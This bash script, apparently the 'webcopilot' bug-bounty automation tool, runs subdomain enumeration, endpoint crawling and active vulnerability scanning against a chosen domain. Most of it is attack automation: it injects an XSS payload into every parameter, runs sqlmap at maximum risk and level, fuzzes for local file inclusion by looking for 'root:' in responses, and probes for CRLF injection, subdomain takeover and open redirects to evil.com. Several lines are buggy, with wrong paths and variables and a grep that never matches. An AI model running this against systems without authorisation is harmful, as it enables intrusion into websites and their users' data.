#!/bin/bash
# Coded by: Harshit Raj Singh aKa G!2m0 @h4r5h1t
# Inspired by: Garud and Pinaak by @ROX4R

###################################################### [Version] ######################################################
VERSION="2.0-beta"

###################################################### [Colors Output] ######################################################
NORMAL="\e[0m"			
RED="\033[0;31m" 		
GREEN="\033[0;32m"		   
BOLD="\033[01;01m"    	
WHITE="\033[1;37m"		
YELLOW="\033[1;33m"	
LRED="\033[1;31m"		
LGREEN="\033[1;32m"		
LBLUE="\033[1;34m"			
LCYAN="\033[1;36m"		
SORANGE="\033[0;33m"		      		
DGRAY="\033[1;30m"		
DSPACE="  "
DTAB="\t\t"
TSPACE="   "
TTAB="\t\t\t"
QSPACE="    "
QTAB="\t\t\t\t"
BLINK="\e[5m"
TICK="\u2714"
CROSS="\u274c"

###################################################### [Prerequisites] ######################################################
# Check if the script is run as root. If not, then exit.
if [ "$(id -u)" != "0" ]; then
    echo -e "${YELLOW}[!] ${LRED}${BOLD}This script must be run as root${NORMAL}" 1>&2
    exit 1
fi

# Check if the internet is working. If not, then exit.
wget -q --spider http://google.com
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}[!] ${LRED}${BOLD}Please check your internet connection${NORMAL}"
    exit 1
fi

###################################################### [Variables] ######################################################
domain=
output=
excl=
threads=
bServer=
allScanning=
subdomainFile=
# quite=
# subdomainFileContent=
# domainList=()

###################################################### [Banner] ######################################################
banner(){
echo -e "\n${BOLD}${LRED}                     
                                ──────▄▀▄─────▄▀▄
                                ─────▄█░░▀▀▀▀▀░░█▄
                                ─▄▄──█░░░░░░░░░░░█──▄▄
                                █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█
 ██╗░░░░░░░██╗███████╗██████╗░░█████╗░░█████╗░██████╗░██╗██╗░░░░░░█████╗░████████╗
░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██╔══██╗╚══██╔══╝
░╚██╗████╗██╔╝█████╗░░██████╦╝██║░░╚═╝██║░░██║██████╔╝██║██║░░░░░██║░░██║░░░██║░░░
░░████╔═████║░██╔══╝░░██╔══██╗██║░░██╗██║░░██║██╔═══╝░██║██║░░░░░██║░░██║░░░██║░░░
░░╚██╔╝░╚██╔╝░███████╗██████╦╝╚█████╔╝╚█████╔╝██║░░░░░██║███████╗╚█████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░"
echo -e "${NORMAL}${BOLD}${QTAB}${DTAB}${DTAB}[●] ${LBLUE}Version: ${NORMAL}${VERSION}"
echo -e "${NORMAL}${BOLD}${QTAB}${DTAB}${DTAB}[●] ${BLINK}${LGREEN}@h4r5h1t${DGRAY} | ${LGREEN}G!2m0${NORMAL}\n"    

echo -e "${NORMAL}\n[${CROSS}] ${NORMAL}Warning: Use with caution. You are responsible for your own actions.${NORMAL}"
echo -e "${NORMAL}[${CROSS}] ${NORMAL}Developers assume no liability and are not responsible for any misuse or damage cause by this tool.${NORMAL}\n"
}

###################################################### [Usage] ######################################################
usage() {
    echo -e "\n${RED}${BOLD}Usage:${NORMAL}"
    echo -e "${DGRAY}webcopilot -d <target>"
    echo -e "${DGRAY}webcopilot -d <target> -a"
    echo -e "${DGRAY}webcopilot [-d target] [-o output destination] [-t threads] [-b blind server URL] [-x exclude domains] [-f subdomains file] [-a] [-v] [-h]${NORMAL}"
    echo -e "${LRED}${BOLD}Flags:${NORMAL}"
    echo -e "  -d        Add your target [Optional]"
    echo -e "  -o        To save outputs in folder [Default: webcopilot-<timestamp>]"
    # echo -e "  -f        Specify a file containing domains [Optional]"
    echo -e "  -t        Number of threads [Default: 100]"
    echo -e "  -b        Add your server for BXSS [Default: False]"
    echo -e "  -x        Exclude out of scope domains [Default: False]"
    echo -e "  -f        Specify a file containing subdomains, this will skip subdomain enumeration [Optional]"
    echo -e "  -a        Run all Enumeration by default it will run only subdomain enumeration [Default: False][${RED}Time Consuming${NORMAL}]"
    # echo -e "  -s        Run only Subdomain Enumeration [Default: False]"
    # echo -e "  -q        Run in quite mode [Default: False]" 
    echo -e "  -v        Show version of the tool"
    echo -e "  -h        Show this help message"
    echo -e "\n${DGRAY}${BOLD}Example:${NORMAL}${GREEN}$0 ${NORMAL} -d ${YELLOW}domain.com${NORMAL} -a -o ${YELLOW}domain${NORMAL} -t ${YELLOW}333${NORMAL} -x ${YELLOW}exclude.txt${NORMAL} -b ${YELLOW}testServer.oast.fun${NORMAL}"
    echo -e "You can use ${LBLUE} ${LBLUE}https://app.interactsh.com/${NORMAL} to get your server" # Server for performing blind injections we can use burpcollabator too
    exit 1
}

# If no arguments are supplied, then show usage
if [ $# -eq 0 ]; then
    banner
    usage
    exit 1
fi

# # Check if data is being piped into the script
# if [ ! -t 0 ]; then
#     # Read stdin into a variable
#     subdomainFileContent=$(cat)
# fi

###################################################### [Parsing] ######################################################
# Parse the command line arguments
while getopts ":b:d:o:t:x:f:hav" arg; do
    case "${arg}" in
        d) domain=${OPTARG} ;;
        o) output=${OPTARG} ;;
        t) threads=${OPTARG} ;;
        x) excl=${OPTARG} ;;
        a) allScanning=True ;;
        b) bServer=${OPTARG} ;;
        f) subdomainFile=${OPTARG} ;;
        v) echo -e "\n${DGRAY}${BOLD}Version:${NORMAL}${GREEN} webcopilot ${VERSION}${NORMAL}\n" && exit 1 ;;
        h | \?) banner && usage && exit 1 ;;
    esac
done
        # d) domainList+=("${OPTARG}") ;;
        # f) while read -r line; do domainList+=("$line"); done < "${OPTARG}" ;;
        # q) quite=True ;;

###################################################### [Pre-Checks] ######################################################
# shift $((OPTIND -1))

# # If no domain, subdomain file or pipe data is provided, then show usage
# if [ -z "$domain" ] && [ -z "$subdomainFile" ] && [ -z "$subdomainFileContent" ]; then
#     echo -e "\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please provide a domain or subdomain file or pipe data${NORMAL}"
#     usage
# fi

# If no domain or subdomain file is provided, then show usage
if [ -z "$domain" ] && [ -z "$subdomainFile" ]; then
    echo -e "\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please provide a domain or subdomain file${NORMAL}"
    usage
fi

# # Check if any domain is provided
# if [ ${#domainList[@]} -eq 0 ]; then
#     echo -e "\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please enter a domain or provide a domains file${NORMAL}"
#     usage
#     exit 1
# fi

# # If no output folder is specified, then use the domain name as the output folder
# if [ -z "$output" ]
#     then
#     output=${domain#*://}
# fi


# If no output folder is specified, then use webcopilot-<timestamp> as the output folder
if [ -z "$output" ]
    then
    output=webcopilot-$(date +%s)
fi

# If no threads are specified, then use 100 threads
if [ -z "$threads" ]
    then
    threads=100
fi

# Make output directory if it doesn't exist already and change directory to it
mkdir -p $output
cd $output/

###################################################### [Main] ######################################################
info() {
    if [ -z "$domain" ];then echo -e "${NORMAL}${WHITE}\nTarget:  ${RED}Subdomains File - ${subdomainFile} ${NORMAL}"; else echo -e "${NORMAL}${WHITE}\nTarget:  ${RED}$domain${NORMAL}"; fi
    echo -e "${NORMAL}${WHITE}Output:  ${GREEN}$(pwd)${NORMAL}"
    echo -e "${NORMAL}${WHITE}Threads: ${GREEN}$threads${NORMAL}"
    if [ -z "$bServer" ];then echo -e "${NORMAL}${WHITE}Server:  ${LRED}False${NORMAL}"; else echo -e "${NORMAL}${WHITE}Server:  ${LBLUE}$bServer${NORMAL}"; fi
    if [ -z "$excl" ];then echo -e "${NORMAL}${WHITE}Exclude: ${LRED}False${NORMAL}"; else echo -e "${NORMAL}${WHITE}Exclude: ${GREEN}$excl${NORMAL}"; fi
    if [ -n "$allScanning" ];then  echo -e "${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Running all Enumeration${NORMAL}"; else echo -e "${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Subdomain Enumeration${NORMAL}"; fi
    echo -e "${NORMAL}${WHITE}Time: ${DGRAY}${TSPACE}$(date "+%d-%m-%Y %H:%M:%S")${NORMAL}"
    echo -e "\n${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please wait while scanning...${NORMAL}"
    # echo -e "${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}${NORMAL}"
}

###################################################### [Passive Subdomain Enumeration] ######################################################

passive_subenum() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Passive Subdomain Scanning is in progress:${NORMAL}\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]"
    [ ! -f temp/assetfinder.txt ] && assetfinder --subs-only $domain | sort -u | anew -q temp/assetfinder.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat temp/assetfinder.txt 2> /dev/null | wc -l )"
    # echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
    # [ ! -f temp/sublister.txt ] && python3 ~/tools/Sublist3r/sublist3r.py -d $domain -t $threads -o temp/sublister.txt &> /dev/null
    # echo -e "\033[2A"
    # echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/sublister.txt 2> /dev/null | wc -l )"

    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}SUBLIST3R_V2.0${NORMAL}]"
    [ ! -f temp/sublisterv2.txt ] && python3 ~/tools/SUBLIST3R_V2.0/sublist3r.py -d $domain -t $threads -o temp/sublisterv2.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}SUBLIST3R_V2.0${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/sublisterv2.txt 2> /dev/null | wc -l )"

    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]"
    [ ! -f temp/subfinder.txt ] && subfinder -silent -d $domain -all -t $threads -o temp/subfinder.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/subfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
    [ ! -f temp/passive_amass.txt ] && amass enum -passive -norecursive -d $domain -o temp/passive_amass.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/amass.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]"
    [ ! -f temp/findomain.txt ] && findomain -r -q -t $domain | anew -q temp/findomain.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/findomain.txt 2> /dev/null | wc -l )\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}crt.sh${NORMAL}]"
    [ ! -f temp/crtsh.txt ] && curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | anew -q temp/crtsh.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}crt.sh${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/crtsh.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}hackertarget${NORMAL}]"
    [ ! -f temp/hackertarget.txt ] && curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | cut -d ',' -f1 | anew -q temp/hackertarget.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}hackertarget${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/hackertarget.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}riddler${NORMAL}]"
    [ ! -f temp/riddler.txt ] && curl -s "https://riddler.io/search/exportcsv?q=pld:$domain" | cut -d ',' -f6 | sed 's/Keywords//' | sed '/^$/d' | anew -q temp/riddler.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}riddler${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/riddler.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}certspotter${NORMAL}]"
    [ ! -f temp/certspotter.txt ] && curl -s "https://certspotter.com/api/v0/certs?domain=$domain" | jq '.[].dns_names[]' | sed 's/\"//g' | anew -q temp/certspotter.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}certspotter${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/certspotter.txt 2> /dev/null | wc -l )\n"
}

###################################################### [Active Subdomain Enumeration] ######################################################
active_subenum() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Active Subdomain Scanning is in progress:${NORMAL}\n"
    echo -e "${NORMAL}${WHITE}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}"
    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}gobuster${NORMAL}]"
    # ffuf -u http://FUZZ.$domain/ -t 200 -p 1.0-2.0 -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200,403 -r -o temp/ffuf.json -s &> /dev/null
    # cat temps/ffuf.json | jq -r '.results[] | {status:.status, host:.host} | .host' 2> /dev/null | anew -q temp/active_ffuf.txt
    [ ! -f temp/active_gobuster.txt ] && gobuster dns -d $domain -w ~/wordlists/subdomains.txt -t $threads --timeout 3s -q -o  temp/active_gobuster.txt
    echo -e "\033[1A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}gobuster${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/active_gobuster.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}amass${NORMAL}]"
    [ ! -f temp/active_amass.txt ] && timeout 22m amass enum -active -brute -w ~/wordlists/subdomains.txt -d $domain -o temp/active_amass.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[●] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/active_amass.txt 2> /dev/null | wc -l )\n"
}

###################################################### [Subdomain Filtering] ######################################################
out_of_scope_subdomain_filtering() {    
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering is in progress:${NORMAL}\n"
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering out of scope subdomains\r"
    cat temp/*.txt | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$domain" | anew -q subdomains/domains.txt
    sleep 1s
    if [ -f "$excl" ]
        then 
            cat subdomains/domains.txt | grep -vf $exclude | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -retry 2 -r ~/wordlists/resolvers.txt -t $threads -silent | grep -E '^((http|https):\/\/)?([a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{1,}(\/.*)?$' | anew -q subdomains/subdomains.txt
        else
            cat subdomains/domains.txt | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -retry 2 -r ~/wordlists/resolvers.txt  -t $threads -silent | grep -E '^((http|https):\/\/)?([a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{1,}(\/.*)?$' | anew -q subdomains/subdomains.txt
    fi
    echo -ne "\n${NORMAL}${BOLD}${SORANGE}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering out of scope subdomains is completed. ${NORMAL}\t Check: ${GREEN}$(echo '/subdomains/subdomains.txt' 2> /dev/null)"
}

alive_subdomain_filtering() {
     echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering:${NORMAL}${BOLD} Filtering Alive subdomains\r"
    [ ! -f temp/alivesub.txt ] && cat subdomains/subdomains.txt | sort -u | uniq -u | httpx -threads $threads -tls-probe -csp-probe -silent -o subdomains/alivesub.txt &> /dev/null
    # [ ! -f temp/alivesub.txt ] && cat subdomains/subdomains.txt | httpx -threads $threads -status-code -silent -timeout 20 -retries 2 -follow-host-redirects -random-agent -no-color 2> /dev/null | anew -q subdomains/alivesub.txt
    [ ! -f temp/alwithouthttp.txt ] && cat subdomains/alivesub.txt | sed -E 's/^\s*.*:\/\///g' | anew -q subdomains/alwithouthttp.txt
    echo -ne "\n${NORMAL}${BOLD}${SORANGE}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering alive subdomains is completed. ${NORMAL}\t Check: ${GREEN}$(echo '/subdomains/alivesub.txt' 2> /dev/null)"
}

###################################################### [Subdomain Visual Inspection] ######################################################
subdomain_inspection() {
    mkdir -p subdomains/aquatone
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Getting titles of valid subdomains\r"
    [ ! -f temp/title.txt ] && cat subdomains/alivesub.txt | httpx -threads $threads -status-code -title -silent  -timeout 20 -retries 2 -follow-host-redirects -random-agent -no-color 2> /dev/null | anew -q subdomains/title.txt
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Visual inspection of Subdomains:${NORMAL} [${GREEN}${BLINK}Aquatone${NORMAL}]"
    [ ! -d temp/aquatone ] && cat subdomains/alivesub.txt | aquatone -chrome-path /snap/bin/chromium -out subdomains/aquatone/ -threads 10 -silent &> /dev/null
    echo -e "\033[1A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Visual inspection of Subdomains is completed. ${NORMAL}\t Check: ${GREEN}$(echo '/subdomains/aquatone/' 2> /dev/null)"
}

###################################################### [Endpoints and Patterns Scanning] ######################################################
crawl_endpoints() {
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning is in progress:${NORMAL}\n"
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\r"
    # [ ! -f temp/gauplus.txt ] && cat subdomains/alivesub.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o temp/gauplus.txt
    # [ ! -f temp/gau.txt ] && cat subdomains/alivesub.txt | gau --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o temp/gau.txt
    # [ ! -f temp/waybackurls.txt ] && cat subdomains/alivesub.txt | waybackurls | anew -q temp/waybackurls.txt
    # [ ! -f temp/endpoints.txt ] && cat temp/gauplus.txt temp/gau.txt temp/waybackurls.txt 2> /dev/null | sed '/\[/d' | grep $domain | sort -u | urldedupe -s | anew -q subdomains/endpoints.txt
    [ ! -f temp/waymore.txt ] && cat subdomains/alivesub.txt | python3 ~/tools/waymore/waymore.py -mode U -oU temp/waymore.txt
    [ ! -f subdomains/endpoints.txt ] && cat temp/waymore.txt 2> /dev/null | sed '/\[/d' | grep $domain | sort -u | urldedupe -s | anew -q subdomains/endpoints.txt

}

endpoints_and_pattern_filtering(){
    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Filtering all endpoints\r"
    [ ! -f patterns/xss.txt ] && cat subdomains/endpoints.txt | uro | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/xss.txt
    [ ! -f patterns/ssrf.txt ] && cat subdomains/endpoints.txt | uro | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/ssrf.txt
    [ ! -f patterns/sqli.txt ] && cat subdomains/endpoints.txt | uro | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/sqli.txt
    [ ! -f patterns/lfi.txt ] && cat subdomains/endpoints.txt | uro | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/lfi.txt
    [ ! -f patterns/rce.txt ] && cat subdomains/endpoints.txt | uro | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/rce.txt
    [ ! -f patterns/openredirect.txt ] && cat subdomains/endpoints.txt | uro | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q patterns/openredirect.txt 

    # echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${RED}${WHITE}\t Total: ${GREEN}$(cat subdomains/endpoints.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed. ${NORMAL}${WHITE}\t Total: ${GREEN}$(cat subdomains/endpoints.txt 2> /dev/null | wc -l )"
    sleep 2s
}

###################################################### [Vulnerabilities Scanning] ######################################################
xss() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning is in progress:${NORMAL}\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}XSS${NORMAL}]\r"
    sleep 2s
    [ ! -f vulnerabilities/check_xss.txt ] && xargs -a patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | cut -d ' ' -f2 | anew -q vulnerabilities/check_xss.txt
    [ ! -f vulnerabilities/xss.txt ] && cat patterns/xss.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[${RED}POTENTIAL XSS${NORMAL}] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q vulnerabilities/xss.txt &> /dev/null
    if [ -n "$bServer" ]
        then
            [ ! -f vulnerabilities/xss_dalfox.txt ] && cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -b $bServer -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null
        else
            [ ! -f vulnerabilities/xss_dalfox.txt ] && cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null
    fi
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}XSS${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/xss.txt 2> /dev/null | wc -l )"
}

sqli() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SQLi${NORMAL}]\r"
    [ ! -d vulnerabilities/sqlmap ] && cat patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=vulnerabilities/sqlmap 2> /dev/null" &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SQLi${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l )"
}

lfi() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}LFI${NORMAL}]\r"
    [ ! -f temp/lfi.txt ] && cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat patterns/lfi.txt | qsreplace % " 2> /dev/null | anew -q temp/lfi.txt
    [ ! -f vulnerabilities/lfi.txt ] && xargs -a tem/lfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q vulnerabilities/lfi.txt 
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}LFI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l )"
}

crlf() {
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}CRLF${NORMAL}]\r"
    [ ! -f vulnerabilities/crlf.txt ] && crlfuzz -l subdomains/alivesub.txt -c $threads -s | anew vulnerabilities/crlf.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}CRLF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l )"
}

subdomain_takeover(){
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Subdomain Takeover${NORMAL}]\r"
    # xargs -a subdomains/subdomains.txt -P 50 -I % bash -c "dig % | grep CNAME"
    # cat cnam | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe -threads $threads -fc 200,301,502,503
    [ ! -f vulnerabilities/takeover.txt ] && subjack -w subdomains/subdomains.txt -t ${threads} -a -o vulnerabilities/.txt
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Subdomain Takeover${TICK}${NORMAL}]\t Found: ${GREEN}$(cat vulnerabilities/takeover.txt 2> /dev/null | wc -l )"
}

openredirect(){
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Open Redirect${NORMAL}]\r"
    [ ! -f temp/openredirect.txt ] && cat patterns/openredirect | qsreplace "http://www.evil.com/" 2> /dev/null | anew -q temp/openredirect.txt
    [ ! -f vulnerabilities/openredirex.txt ] && python3 ~/tools/openredirex/openredirex.py -l temp/openredirect.txt --keyword FUZZ -p ~/tools/openredirex/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q vulnerabilities/openredirex.txt &> /dev/null
